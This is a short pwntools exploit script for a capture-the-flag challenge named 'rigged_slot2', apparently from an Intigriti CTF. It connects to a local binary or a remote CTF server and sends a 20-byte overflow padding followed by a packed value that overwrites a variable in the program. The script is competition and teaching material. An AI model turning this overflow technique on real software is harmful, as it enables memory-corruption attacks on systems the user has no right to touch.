#!/usr/bin/env python3

from pwn import *

exe = ELF("./rigged_slot2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("riggedslot2.ctf.intigriti.io", 1337)

    return r


def main():
    r = conn()
    input()
    payload = b'A'*20 + p32(0x146851)
    r.sendlineafter(b'name:', payload)
    pause()
    r.sendlineafter(b'spin):', b'5')
    pause()
    info(r.recvall(3))
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
